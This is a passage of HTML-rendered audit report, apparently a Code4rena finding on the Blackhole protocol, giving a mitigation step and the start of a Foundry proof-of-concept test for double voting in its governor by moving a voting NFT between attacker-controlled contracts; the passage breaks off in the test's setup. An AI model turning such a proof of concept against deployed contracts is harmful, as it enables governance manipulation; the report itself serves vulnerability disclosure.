class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003ereason\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eweight\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"recommended-mitigation-steps-18\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-18\" aria-label=\"recommended mitigation steps 18 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003ePerform a check just like in \u003ccode\u003eVotingEscrow::balanceOfNFT\u003c/code\u003e whether ownership was changed in the current block number.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-12\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-12\" aria-label=\"proof of concept 12 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eThis POC is written in foundry, in order to run it, one has to create foundry project, download dependencies, create remappings and change imports in some of the file to look inside the “src” folder\u003c/p\u003e\n\u003cp\u003eThe POC is the simple version of the finding, in order to run it one has to first change the code of the Governor, so that other vulnerability in the code is fixed, as without that change proposals DO NOT WORK. Look at the \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-163\"\u003e\u003ccode\u003egetVotes\u003c/code\u003e inside the \u003ccode\u003eBlackGovernor\u003c/code\u003e incorrectly provides \u003ccode\u003eblock.number\u003c/code\u003e instead of \u003ccode\u003eblock.timestamp\u003c/code\u003e, leading to complete DOS of proposal functionality\u003c/a\u003e finding.\u003c/p\u003e\n\u003cp\u003eThis POC is not perfect, as it utilizes also vulnerability found in \u003ccode\u003egetsmNFTPastVotes\u003c/code\u003e (finding that if provided timestamp to the function is smaller than the timestamp of the first checkpoint, function evaluates \u003ccode\u003etokenIds\u003c/code\u003e from the first checkpoint) that is also submitted. However, if one would create a contract that casts a vote at \u003ccode\u003evoteStart\u003c/code\u003e timestamp, transfers NFT to another attacker controlled smart contract, the outcome will be the same.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"68\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003epragma\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esolidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ^\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0.8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e13\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;forge-std/Test.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBlack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/Black.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMinterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/MinterUpgradeable.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eRewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/RewardsDistributor.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/PermissionsRegistry.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/TokenHandler.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eVoterV3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/VoterV3.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eVotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/VotingEscrow.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAutoVotingEscrowManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/AVM/AutoVotingEscrowManager.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/GaugeManager.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/PairGenerator.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/factories/GaugeFactory.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/factories/PairFactory.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/AlgebraCLVe33/GaugeFactoryCL.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBlackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/BlackGovernor.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIBlackHoleVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/interfaces/IBlackHoleVotes.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/interfaces/IMinter.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003econtract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDoubleVoteTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBlack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eRewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMinterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAutoVotingEscrowManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eVotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eVoterV3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_2CL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBlackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eadmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0xAD\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprotocol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0x1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan 